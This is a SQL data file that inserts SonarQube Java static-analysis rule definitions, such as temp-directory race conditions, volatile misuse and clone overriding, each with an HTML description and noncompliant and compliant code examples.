INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2974', 'Classes without "public" constructors should be "final"', 'sonarqube', 'Code Smell', '<p>Classes with only <code>private</code> constructors should be marked <code>final</code> to prevent any mistaken extension attempts.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class PrivateConstructorClass {  // Noncompliant
  private PrivateConstructorClass() {
    // ...
  }

  public static int magic(){
    return 42;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public final class PrivateConstructorClass {  // Compliant
  private PrivateConstructorClass() {
    // ...
  }

  public static int magic(){
    return 42;
  }
}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2975', '"clone" should not be overridden', 'sonarqube', 'Code Smell', '<p>Many consider <code>clone</code> and <code>Cloneable</code> broken in Java, largely because the rules for overriding <code>clone</code> are tricky
and difficult to get right, according to Joshua Bloch:</p>
<blockquote>
  Object''s clone method is very tricky. It''s based on field copies, and it''s "extra-linguistic." It creates an object without calling a constructor.
  There are no guarantees that it preserves the invariants established by the constructors. There have been lots of bugs over the years, both in and
  outside Sun, stemming from the fact that if you just call super.clone repeatedly up the chain until you have cloned an object, you have a shallow
  copy of the object. The clone generally shares state with the object being cloned. If that state is mutable, you don''t have two independent objects.
  If you modify one, the other changes as well. And all of a sudden, you get random behavior.
</blockquote>
<p>A copy constructor or copy factory should be used instead.</p>
<p>This rule raises an issue when <code>clone</code> is overridden, whether or not <code>Cloneable</code> is implemented.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyClass {
  // ...

  public Object clone() { // Noncompliant
    //...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyClass {
  // ...

  MyClass (MyClass source) {
    //...
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.artima.com/intv/bloch13.html">Copy Constructor versus Cloning</a> </li>
</ul>
<h3>See Also</h3>
<ul>
  <li> <a href=''/coding_rules#rule_key=java%3AS2157''>S2157</a> - "Cloneables" should implement "clone" </li>
  <li> <a href=''/coding_rules#rule_key=java%3AS1182''>S1182</a> - Classes that override "clone" should be "Cloneable" and call "super.clone()" </li>
</ul>', 'java', 'READY', 'BLOCKER', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2976', '"File.createTempFile" should not be used to create a directory', 'sonarqube', 'Vulnerability', '<p>Using <code>File.createTempFile</code> as the first step in creating a temporary directory causes a race condition and is inherently unreliable and
insecure. Instead, <code>Files.createTempDirectory</code> (Java 7+) or a library function such as Guava''s similarly-named
<code>Files.createTempDir</code> should be used.</p>
<p>This rule raises an issue when the following steps are taken in immediate sequence:</p>
<ul>
  <li> call to <code>File.createTempFile</code> </li>
  <li> delete resulting file </li>
  <li> call <code>mkdir</code> on the File object </li>
</ul>
<p><strong>Note</strong> that this rule is automatically disabled when the project''s <code>sonar.java.source</code> is lower than <code>7</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
File tempDir;
tempDir = File.createTempFile("", ".");
tempDir.delete();
tempDir.mkdir();  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
Path tempPath = Files.createTempDirectory("");
File tempDir = tempPath.toFile();
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A9-Using_Components_with_Known_Vulnerabilities">OWASP Top 10 2017 Category A9</a> - Using
  Components with Known Vulnerabilities </li>
</ul>
<h2>Deprecated</h2>
<p>This rule is deprecated; use <a href=''/coding_rules#rule_key=java%3AS5445''>S5445</a> instead.</p>', 'java', 'DEPRECATED', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3008', 'Static non-final field names should comply with a naming convention', 'sonarqube', 'Code Smell', '<p>Shared naming conventions allow teams to collaborate efficiently. This rule checks that static non-final field names match a provided regular
expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression <code>^[a-z][a-zA-Z0-9]*$</code>:</p>
<pre>
public final class MyClass {
   private static String foo_bar;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class MyClass {
   private static String fooBar;
}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3010', 'Static fields should not be updated in constructors', 'sonarqube', 'Code Smell', '<p>Assigning a value to a <code>static</code> field in a constructor could cause unreliable behavior at runtime since it will change the value for all
instances of the class.</p>
<p>Instead remove the field''s <code>static</code> modifier, or initialize it statically.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Person {
  static Date dateOfBirth;
  static int expectedFingers;

  public Person(date birthday) {
    dateOfBirth = birthday;  // Noncompliant; now everyone has this birthday
    expectedFingers = 10;  // Noncompliant
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Person {
  Date dateOfBirth;
  static int expectedFingers = 10;

  public Person(date birthday) {
    dateOfBirth = birthday;
  }
}
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3011', 'Reflection should not be used to increase accessibility of classes, methods, or fields', 'sonarqube', 'Code Smell', '<p>This rule raises an issue when reflection is used to change the visibility of a class, method or field, and when it is used to directly update a
field value. Altering or bypassing the accessibility of classes, methods, or fields violates the encapsulation principle and could lead to run-time
errors.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void makeItPublic(String methodName) throws NoSuchMethodException {

  this.getClass().getMethod(methodName).setAccessible(true); // Noncompliant
}

public void setItAnyway(String fieldName, int value) {
  this.getClass().getDeclaredField(fieldName).setInt(this, value); // Noncompliant; bypasses controls in setter
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/_jZGBQ">CERT, SEC05-J.</a> - Do not use reflection to increase accessibility of classes,
  methods, or fields </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3012', 'Arrays should not be copied using loops', 'sonarqube', 'Code Smell', '<p>Using a loop to copy an array or a subset of an array is simply wasted code when there are built-in functions to do it for you. Instead, use
<code>Arrays.copyOf</code> to copy an entire array into another array, use <code>System.arraycopy</code> to copy only a subset of an array into
another array, and use <code>Arrays.asList</code> to feed the constructor of a new list with an array.</p>
<p>Note that <code>Arrays.asList</code> simply puts a <code>Collections</code> wrapper around the original array, so further steps are required if a
non-fixed-size <code>List</code> is desired.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void makeCopies(String[] source) {

  this.array = new String[source.length];
  this.list = new ArrayList(source.length);

  for (int i = 0; i &lt; source.length; i++) {
    this.array[i] = source[i]; // Noncompliant
  }

  for (String s : source) {
    this.list.add(s); // Noncompliant
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void makeCopies(String[] source) {
  this.array = Arrays.copyOf(source, source.length);
  Collections.addAll(this.list, source);
}
</pre>
<h2>Exceptions</h2>
<p>Rule detects only the most idiomatic patterns, it will not consider loops with non-trivial control flow. For example, array elements that are
copied conditionally are ignored.</p>
<pre>
public int[] getCopy(int[] source) {
  int[] dest = new int[source.length];
  for (int i = 0; i &lt; source.length; i++) {
    if (source[i] &gt; 10) {
      dest[i] = source[i];  // Compliant
    }
  }
  return dest;
}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3014', '"ThreadGroup" should not be used', 'sonarqube', 'Code Smell', '<p>There is little valid reason to use the methods of the <code>ThreadGroup</code> class. Some are deprecated (<code>allowThreadSuspension()</code>,
<code>resume()</code>, <code>stop()</code>, and <code>suspend()</code>), some are obsolete, others aren''t thread-safe, and still others are insecure
(<code>activeCount()</code>, <code>enumerate()</code>) . For these reasons, any use of <code>ThreadGroup</code> is suspicious and should be
avoided.</p>
<h2>Compliant Solution</h2>
<pre>
ThreadFactory threadFactory = Executors.defaultThreadFactory();
ThreadPoolExecutor executorPool = new ThreadPoolExecutor(3, 10, 5, TimeUnit.SECONDS, new ArrayBlockingQueue&lt;Runnable&gt;(2), threadFactory);

for (int i = 0; i &lt; 10; i++) {
  executorPool.execute(new JobThread("Job: " + i));
}

System.out.println(executorPool.getActiveCount()); // Compliant
executorPool.shutdown();
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/YzdGBQ">CERT, THI01-J.</a> - Do not invoke ThreadGroup methods </li>
</ul>', 'java', 'READY', 'BLOCKER', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3020', '"toArray" should be passed an array of the proper type', 'sonarqube', 'Bug', '<p>Given no arguments, the <code>Collections.toArray</code> method returns an <code>Object []</code>, which will cause a
<code>ClassCastException</code> at runtime if you try to cast it to an array of the proper class. Instead, pass an array of the correct type in to the
call.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public String [] getStringArray(List&lt;String&gt; strings) {
  return (String []) strings.toArray();  // Noncompliant; ClassCastException thrown
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public String [] getStringArray(List&lt;String&gt; strings) {
  return strings.toArray(new String[0]);
}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3027', 'String function use should be optimized for single characters', 'sonarqube', 'Code Smell', '<p>An <code>indexOf</code> or <code>lastIndexOf</code> call with a single letter <code>String</code> can be made more performant by switching to a
call with a <code>char</code> argument.</p>
<h2>Noncompliant Code Example</h2>
<pre>
String myStr = "Hello World";
// ...
int pos = myStr.indexOf("W");  // Noncompliant
// ...
int otherPos = myStr.lastIndexOf("r"); // Noncompliant
// ...
</pre>
<h2>Compliant Solution</h2>
<pre>
String myStr = "Hello World";
// ...
int pos = myStr.indexOf(''W'');
// ...
int otherPos = myStr.lastIndexOf(''r'');
// ...
</pre>
<h2>Deprecated</h2>
<p>This rule is deprecated, and will eventually be removed.</p>', 'java', 'DEPRECATED', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3030', 'Classes should not have too many "static" imports', 'sonarqube', 'Code Smell', '<p>Importing a class statically allows you to use its <code>public static</code> members without qualifying them with the class name. That can be
handy, but if you import too many classes statically, your code can become confusing and difficult to maintain.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default threshold value: 4</p>
<pre>
import static java.lang.Math.*;
import static java.util.Collections.*;
import static com.myco.corporate.Constants.*;
import static com.myco.division.Constants.*;
import static com.myco.department.Constants.*;  // Noncompliant
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3032', 'JEE applications should not "getClassLoader"', 'sonarqube', 'Bug', '<p>Using the standard <code>getClassLoader()</code> may not return the <em>right</em> class loader in a JEE context. Instead, go through the
<code>currentThread</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
ClassLoader cl = this.getClass().getClassLoader();  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
ClassLoader cl = Thread.currentThread().getContextClassLoader();
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3034', 'Raw byte values should not be used in bitwise operations in combination with shifts', 'sonarqube', 'Bug', '<p>When reading bytes in order to build other primitive values such as <code>int</code>s or <code>long</code>s, the <code>byte</code> values are
automatically promoted, but that promotion can have unexpected results.</p>
<p>For instance, the binary representation of the integer 640 is <code>0b0000_0010_1000_0000</code>, which can also be written with the array of
(unsigned) bytes <code>[2, 128]</code>. However, since Java uses two''s complement, the representation of the integer in signed bytes will be <code>[2,
-128]</code> (because the <code>byte</code> <code>0b1000_0000</code> is promoted to the <code>int</code>
<code>0b1111_1111_1111_1111_1111_1111_1000_0000</code>). Consequently, trying to reconstruct the initial integer by shifting and adding the values of
the bytes without taking care of the sign will not produce the expected result. </p>
<p>To prevent such accidental value conversion, use bitwise and (<code>&amp;</code>) to combine the <code>byte</code> value with <code>0xff</code>
(255) and turn all the higher bits back off.</p>
<p>This rule raises an issue any time a <code>byte</code> value is used as an operand without <code>&amp; 0xff</code>, when combined with shifts.</p>
<h2>Noncompliant Code Example</h2>
<pre>
  int intFromBuffer() {
    int result = 0;
    for (int i = 0; i &lt; 4; i++) {
      result = (result &lt;&lt; 8) | readByte(); // Noncompliant
    }
    return result;
  }
</pre>
<h2>Compliant Solution</h2>
<pre>
  int intFromBuffer() {
    int result = 0;
    for (int i = 0; i &lt; 4; i++) {
      result = (result &lt;&lt; 8) | (readByte() &amp; 0xff);
    }
    return result;
  }
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/kDZGBQ">CERT, NUM52-J.</a> - Be aware of numeric promotion behavior </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3038', 'Abstract methods should not be redundant', 'sonarqube', 'Code Smell', '<p>There''s no point in redundantly defining an <code>abstract</code> method with the same signature as a method in an <code>interface</code> that the
class <code>implements</code>. Any concrete child classes will have to implement the method either way.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public interface Reportable {
  String getReport();
}

public abstract class AbstractRuleReport implements Reportable{
  public abstract String getReport();  // Noncompliant

  // ...
}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3039', '"String" calls should not go beyond their bounds', 'sonarqube', 'Bug', '<p>Just as you can''t cut something into three halves, you can''t grab a <code>substring</code> that starts or ends outside the original
<code>String</code>''s bounds, you can''t use <code>substring</code> to get a reversed portion of a <code>String</code>, and you can''t get the
<code>charAt</code> a value that''s before the <code>String</code> starts or after it ends.</p>
<p>This rule detects when negative literal or <code>String::length</code> is passed as an argument to the <code>String::substring</code>,
<code>String::charAt</code> and related methods.</p>
<h2>Noncompliant Code Example</h2>
<pre>
String speech = "Now is the time for all good people to come to the aid of their country.";

String substr1 = speech.substring(-1, speech.length());  // Noncompliant; start and end values both bad
String substr2 = speech.substring(speech.length(), 0); // Noncompliant, start value must be &lt; end value
char ch = speech.charAt(speech.length());  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
String speech = "Now is the time for all good people to come to the aid of their country.";

String substr1 = speech; // Closest correct values to original code yield whole string
String substr2 = new StringBuilder(speech).reverse().toString()
char ch = speech.charAt(speech.length()-1);
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3042', '"writeObject" should not be the only "synchronized" code in a class', 'sonarqube', 'Code Smell', '<p>The purpose of synchronization is to ensure that only one thread executes a given block of code at a time. There''s no real problem with marking
<code>writeObject</code> <code>synchronized</code>, but it''s highly suspicious if this serialization-related method is the only
<code>synchronized</code> code in a <code>class</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class RubberBall {

  private Color color;
  private int diameter;

  public RubberBall(Color color, int diameter) {
    // ...
  }

  public void bounce(float angle, float velocity) {
    // ...
  }

  private synchronized void writeObject(ObjectOutputStream stream) throws IOException { // Noncompliant
    // ...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class RubberBall {

  private Color color;
  private int diameter;

   public RubberBall(Color color, int diameter) {
    // ...
  }

  public void bounce(float angle, float velocity) {
    // ...
  }

  private void writeObject(ObjectOutputStream stream) throws IOException {
    // ...
  }
}
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3046', '"wait" should not be called when multiple locks are held', 'sonarqube', 'Bug', '<p>When two locks are held simultaneously, a <code>wait</code> call only releases one of them. The other will be held until some other thread requests
a lock on the awaited object. If no unrelated code tries to lock on that object, then all other threads will be locked out, resulting in a
deadlock.</p>
<h2>Noncompliant Code Example</h2>
<pre>
synchronized (this.mon1) {  // threadB can''t enter this block to request this.mon2 lock &amp; release threadA
	synchronized (this.mon2) {
		this.mon2.wait();  // Noncompliant; threadA is stuck here holding lock on this.mon1
	}
}
</pre>', 'java', 'READY', 'BLOCKER', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3047', 'Multiple loops over the same set should be combined', 'sonarqube', 'Code Smell', '<p>When a method loops multiple over the same set of data, whether it''s a list or a set of numbers, it is highly likely that the method could be made
more efficient by combining the loops into a single set of iterations.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void doSomethingToAList(List&lt;String&gt; strings) {
  for (String str : strings) {
    doStep1(str);
  }
  for (String str : strings) {  // Noncompliant
    doStep2(str);
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void doSomethingToAList(List&lt;String&gt; strings) {
  for (String str : strings) {
    doStep1(str);
    doStep2(str);
  }
}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3052', 'Fields should not be initialized to default values', 'sonarqube', 'Code Smell', '<p>The compiler automatically initializes class fields to their default values before setting them with any initialization values, so there is no need
to explicitly set a field to its default value. Further, under the logic that cleaner code is better code, it''s considered poor style to do so.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyClass {

  int count = 0;  // Noncompliant
  // ...

}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyClass {

  int count;
  // ...

}
</pre>
<h2>Exceptions</h2>
<p><code>final</code> fields are ignored.</p>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3064', 'Assignment of lazy-initialized members should be the last step with double-checked locking', 'sonarqube', 'Bug', '<p>Double-checked locking can be used for lazy initialization of <code>volatile</code> fields, but only if field assignment is the last step in the
<code>synchronized</code> block. Otherwise you run the risk of threads accessing a half-initialized object.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyClass {

  private volatile List&lt;String&gt; strings;

  public List&lt;String&gt; getStrings() {
    if (strings == null) {  // check#1
      synchronized(MyClass.class) {
        if (strings == null) {
          strings = new ArrayList&lt;&gt;();  // Noncompliant
          strings.add("Hello");  //When threadA gets here, threadB can skip the synchronized block because check#1 is false
          strings.add("World");
        }
      }
    }
    return strings;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyClass {

  private volatile List&lt;String&gt; strings;

  public List&lt;String&gt; getStrings() {
    if (strings == null) {  // check#1
      synchronized(MyClass.class) {
        if (strings == null) {
          List&lt;String&gt; tmpList = new ArrayList&lt;&gt;();
          tmpList.add("Hello");
          tmpList.add("World");
          strings = tmpList;
        }
      }
    }
    return strings;
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/6zdGBQ">CERT, LCK10-J.</a> - Use a correct form of the double-checked locking idiom </li>
</ul>
<h3>See Also</h3>
<ul>
  <li> <a href=''/coding_rules#rule_key=java%3AS2168''>S2168</a> - Double-checked locking should not be used </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3065', 'Min and max used in combination should not always return the same value', 'sonarqube', 'Bug', '<p>When using <code>Math.min()</code> and <code>Math.max()</code> together for bounds checking, it''s important to feed the right operands to each
method. <code>Math.min()</code> should be used with the <strong>upper</strong> end of the range being checked, and <code>Math.max()</code> should be
used with the <strong>lower</strong> end of the range. Get it backwards, and the result will always be the same end of the range.</p>
<h2>Noncompliant Code Example</h2>
<pre>
  private static final int UPPER = 20;
  private static final int LOWER = 0;

  public int doRangeCheck(int num) {    // Let''s say num = 12
    int result = Math.min(LOWER, num);  // result = 0
    return Math.max(UPPER, result);     // Noncompliant; result is now 20: even though 12 was in the range
  }
</pre>
<h2>Compliant Solution</h2>
<p>Swapping method <code>min()</code> and <code>max()</code> invocations without changing parameters.</p>
<pre>
  private static final int UPPER = 20;
  private static final int LOWER = 0;

  public int doRangeCheck(int num) {    // Let''s say num = 12
    int result = Math.max(LOWER, num);  // result = 12
    return Math.min(UPPER, result);     // Compliant; result is still 12
  }
</pre>
<p>or swapping bounds <code>UPPER</code> and <code>LOWER</code> used as parameters without changing the invoked methods.</p>
<pre>
  private static final int UPPER = 20;
  private static final int LOWER = 0;

  public int doRangeCheck(int num) {    // Let''s say num = 12
    int result = Math.min(UPPER, num);  // result = 12
    return Math.max(LOWER, result);     // Compliant; result is still 12
  }
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3066', '"enum" fields should not be publicly mutable', 'sonarqube', 'Code Smell', '<p><code>enum</code>s are generally thought of as constant, but an <code>enum</code> with a <code>public</code> field or <code>public</code> setter is
non-constant. Ideally fields in an <code>enum</code> are <code>private</code> and set in the constructor, but if that''s not possible, their visibility
should be reduced as much as possible.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public enum Continent {

  NORTH_AMERICA (23, 24709000),
  // ...
  EUROPE (50, 39310000);

  public int countryCount;  // Noncompliant
  private int landMass;

  Continent(int countryCount, int landMass) {
    // ...
  }

  public void setLandMass(int landMass) {  // Noncompliant
    this.landMass = landMass;
  }
</pre>
<h2>Compliant Solution</h2>
<pre>
public enum Continent {

  NORTH_AMERICA (23, 24709000),
  // ...
  EUROPE (50, 39310000);

  private int countryCount;
  private int landMass;

  Continent(int countryCount, int landMass) {
    // ...
  }
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3067', '"getClass" should not be used for synchronization', 'sonarqube', 'Bug', '<p><code>getClass</code> should not be used for synchronization in non-<code>final</code> classes because child classes will synchronize on a
different object than the parent or each other, allowing multiple threads into the code block at once, despite the <code>synchronized</code>
keyword.</p>
<p>Instead, hard code the name of the class on which to synchronize or make the class <code>final</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyClass {
  public void doSomethingSynchronized(){
    synchronized (this.getClass()) {  // Noncompliant
      // ...
    }
  }
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyClass {
  public void doSomethingSynchronized(){
    synchronized (MyClass.class) {
      // ...
    }
  }
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/qTdGBQ">CERT, LCK02-J.</a> - Do not synchronize on the class object returned by getClass() </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3077', 'Non-primitive fields should not be "volatile"', 'sonarqube', 'Bug', '<p>Marking an array <code>volatile</code> means that the array itself will always be read fresh and never thread cached, but the items <em>in</em> the
array will not be. Similarly, marking a mutable object field <code>volatile</code> means the object <em>reference</em> is <code>volatile</code> but
the object itself is not, and other threads may not see updates to the object state.</p>
<p>This can be salvaged with arrays by using the relevant AtomicArray class, such as <code>AtomicIntegerArray</code>, instead. For mutable objects,
the <code>volatile</code> should be removed, and some other method should be used to ensure thread-safety, such as synchronization, or ThreadLocal
storage.</p>
<h2>Noncompliant Code Example</h2>
<pre>
private volatile int [] vInts;  // Noncompliant
private volatile MyObj myObj;  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
private AtomicIntegerArray vInts;
private MyObj myObj;
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/UzdGBQ">CERT, CON50-J.</a> - Do not assume that declaring a reference volatile guarantees safe
  publication of the members of the referenced object </li>
</ul>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3078', '"volatile" variables should not be used with compound operators', 'sonarqube', 'Bug', '<p>Using compound operators as well as increments and decrements (and toggling, in the case of <code>boolean</code>s) on primitive fields are not
atomic operations. That is, they don''t happen in a single step. For instance, when a <code>volatile</code> primitive field is incremented or
decremented you run the risk of data loss if threads interleave in the steps of the update. Instead, use a guaranteed-atomic class such as
<code>AtomicInteger</code>, or synchronize the access.</p>
<h2>Noncompliant Code Example</h2>
<pre>
private volatile int count = 0;
private volatile boolean boo = false;

public void incrementCount() {
  count++;  // Noncompliant
}

public void toggleBoo(){
  boo = !boo;  // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
private AtomicInteger count = 0;
private boolean boo = false;

public void incrementCount() {
  count.incrementAndGet();
}

public synchronized void toggleBoo() {
  boo = !boo;
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/SjdGBQ">CERT, VNA02-J.</a> - Ensure that compound operations on shared variables are atomic
  </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3242', 'Method parameters should be declared with base types', 'sonarqube', 'Code Smell', '<p>For maximum reusability, methods should accept parameters with as little specialization as possible. So unless specific features from a child class
are required by a method, a type higher up the class hierarchy should be used instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void printSize(ArrayList&lt;Object&gt; list) {  // Collection can be used instead
    System.out.println(list.size());
}

public static void loop(List&lt;Object&gt; list) { // java.lang.Iterable can be used instead
   for (Object o : list) {
     o.toString();
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void printSize(Collection&lt;?&gt; list) {  // Collection can be used instead
    System.out.println(list.size());
}

public static void loop(Iterable&lt;?&gt; list) { // java.lang.Iterable can be used instead
   for (Object o : list) {
     o.toString();
  }
}
</pre>
<h2>Exceptions</h2>
<p>Parameters in non-public methods are not checked, because such methods are not intended to be generally reusable. <code>java.lang.String</code>
parameters are excluded, because String is immutable and can not be always substituted for more generic type. Parameters used in any other context
than method invocation or enhanced for loop are also excluded.</p>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3252', '"static" base class members should not be accessed via derived types', 'sonarqube', 'Code Smell', '<p>In the interest of code clarity, <code>static</code> members of a <code>base</code> class should never be accessed using a derived type''s name.
Doing so is confusing and could create the illusion that two different static members exist.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class Parent {
  public static int counter;
}

class Child extends Parent {
  public Child() {
    Child.counter++;  // Noncompliant
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class Parent {
  public static int counter;
}

class Child extends Parent {
  public Child() {
    Parent.counter++;
  }
}
</pre>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3254', 'Default annotation parameter values should not be passed as arguments', 'sonarqube', 'Code Smell', '<p>Specifying the default value for an annotation parameter is redundant. Such values should be omitted in the interests of readability.</p>
<h2>Noncompliant Code Example</h2>
<pre>
@MyAnnotation(arg = "def")  // Noncompliant
public class MyClass {
  // ...
}
public @interface MyAnnotation {
  String arg() default "def";
}
</pre>
<h2>Compliant Solution</h2>
<pre>
@MyAnnotation
public class MyClass {
  // ...
}
public @interface MyAnnotation {
  String arg() default "def";
}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3281', 'Default EJB interceptors should be declared in "ejb-jar.xml"', 'sonarqube', 'Vulnerability', '<p>Default interceptors, such as application security interceptors, must be listed in the <code>ejb-jar.xml</code> file, or they will not be treated
as default.</p>
<p>This rule applies to projects that contain JEE Beans (any one of <code>javax.ejb.Singleton</code>, <code>MessageDriven</code>,
<code>Stateless</code> or <code>Stateful</code>).</p>
<h2>Noncompliant Code Example</h2>
<pre>
// file: ejb-interceptors.xml
&lt;assembly-descriptor&gt;
 &lt;interceptor-binding&gt; &lt;!-- should be declared in ejb-jar.xml --&gt;
      &lt;ejb-name&gt;*&lt;/ejb-name&gt;
      &lt;interceptor-class&gt;com.myco.ImportantInterceptor&lt;/interceptor-class&gt; &lt;!-- Noncompliant; will NOT be treated as default --&gt;
   &lt;/interceptor-binding&gt;
&lt;/assembly-descriptor&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
// file: ejb-jar.xml
&lt;assembly-descriptor&gt;
 &lt;interceptor-binding&gt;
      &lt;ejb-name&gt;*&lt;/ejb-name&gt;
      &lt;interceptor-class&gt;com.myco.ImportantInterceptor&lt;/interceptor-class&gt;
   &lt;/interceptor-binding&gt;
&lt;/assembly-descriptor&gt;
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
</ul>', 'java', 'READY', 'BLOCKER', 'BLOCK');
